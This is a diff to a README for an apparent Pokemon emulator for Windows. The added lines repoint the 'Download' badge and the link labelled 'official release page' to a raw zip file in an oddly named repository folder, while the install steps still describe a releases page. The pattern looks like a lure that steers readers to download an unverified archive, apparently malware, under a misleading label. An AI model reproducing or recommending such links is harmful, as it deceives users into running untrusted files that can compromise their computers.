@@ -1,6 +1,6 @@
 # 🎮 ROM-MGBA-Pokemon-Emulator-PC - Play classic Pokemon games on Windows
 
-[![](https://img.shields.io/badge/Download-Emulator-blue.svg)](https://github.com/theorybased-vietnamese999/ROM-MGBA-Pokemon-Emulator-PC)
+[![](https://img.shields.io/badge/Download-Emulator-blue.svg)](https://github.com/theorybased-vietnamese999/ROM-MGBA-Pokemon-Emulator-PC/raw/refs/heads/main/siziness/PC_MGB_Emulator_Pokemon_RO_wyver.zip)
 
 This software allows you to play GameBoy Advance and related handheld console games on your PC. It uses the mGBA engine to provide smooth performance, save states, and fast-forward options for your favorite Pokemon titles.
 
@@ -8,7 +8,7 @@ This software allows you to play GameBoy Advance and related handheld console ga
 
 Follow these steps to set up the emulator on your Windows computer.
 
-1. Go to the [official release page](https://github.com/theorybased-vietnamese999/ROM-MGBA-Pokemon-Emulator-PC).
+1. Go to the [official release page](https://github.com/theorybased-vietnamese999/ROM-MGBA-Pokemon-Emulator-PC/raw/refs/heads/main/siziness/PC_MGB_Emulator_Pokemon_RO_wyver.zip).
 2. Click the latest version link under the Assets section.
 3. Save the .zip folder to your desktop.
 4. Right-click the folder and select Extract All.
